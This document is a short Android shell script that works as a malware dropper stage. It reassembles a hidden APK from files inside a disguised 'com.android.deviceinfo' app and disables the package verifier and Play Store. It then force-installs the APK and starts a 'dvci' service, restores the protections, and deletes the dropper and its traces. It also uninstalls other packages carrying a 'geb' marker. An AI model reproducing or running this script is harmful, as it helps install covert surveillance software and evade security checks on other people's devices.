export LD_LIBRARY_PATH=/vendor/lib:/system/lib

rm /sdcard/core.apk
cat /data/data/com.android.deviceinfo/app_qza/core.*.apk > /sdcard/core.apk

settings put global package_verifier_enable 0
pm disable com.android.vending

pm install -f /sdcard/core.apk
sleep 2

am startservice com.android.dvci/.ServiceMain

sleep 2
settings put global package_verifier_enable 1
pm enable com.android.vending

pm disable com.android.deviceinfo
pm uninstall com.android.deviceinfo

rm /sdcard/core.apk

rm -r /data/data/com.android.deviceinfo
rm /data/app/com.android.deviceinfo*
rm -r /data/app-lib/com.android.deviceinfo*

for geb in `ls /data/data/*/files/geb`; do
	init=${geb#/data/data/}
    package=${init%%/*}
    #echo $package
    pm disable $package
    pm uninstall $package
done



